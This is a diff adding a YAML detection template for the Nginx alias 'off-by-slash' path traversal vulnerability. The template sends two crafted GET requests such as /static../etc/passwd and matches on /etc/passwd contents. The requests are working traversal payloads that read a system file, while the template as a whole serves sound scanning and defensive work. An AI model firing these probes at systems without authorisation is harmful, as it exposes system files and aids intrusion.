@@ -1,0 +1,16 @@
+name: Nginx Alias Path Traversal
+description: Detects the Nginx off-by-slash alias configuration vulnerability. When an alias directive lacks a trailing slash while the location does, attackers can traverse outside the intended directory by appending ../ sequences to the URL.
+severity: high
+cwe: CWE-22
+
+requests:
+  - method: GET
+    path: /static../etc/passwd
+  - method: GET
+    path: /files../etc/passwd
+
+matchers:
+  - body_contains: "root:x:0:0"
+  - body_contains: "/bin/bash"
+  - regex: "root:[x*]:[0-9]+:[0-9]+"
+  - status_code: 200
